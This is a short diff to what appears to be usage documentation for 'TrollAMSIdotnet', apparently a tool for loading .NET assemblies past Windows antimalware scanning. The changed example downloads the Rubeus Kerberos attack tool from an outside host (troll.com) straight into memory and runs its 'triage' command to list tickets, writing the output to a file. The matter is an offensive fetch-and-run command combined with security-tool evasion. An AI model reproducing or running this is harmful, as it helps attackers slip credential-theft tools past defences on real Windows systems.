@@ -13,7 +13,7 @@ $asm = [TrollAMSIdotnet]::Load(<BYTE_ARRAY_DOWNLOAD>,<ASSEMBLY_NAME>)
 
 ## Example 
 ```
-$asm = [TrollAMSIdotnet]::Load([System.IO.File]::ReadAllBytes("C:\Troll.exe"),"Rubeus.exe") 
+$asm = [TrollAMSIdotnet]::Load((New-Object System.Net.WebClient).DownloadData("https://troll.com/Rubeus.exe"),"Rubeus.exe") 
 [string[]]$args = "triage", "/consoleoutfile:C:\FILE.txt"
 [TrollAMSIdotnet]::Invoke($asm,$args)
 ```
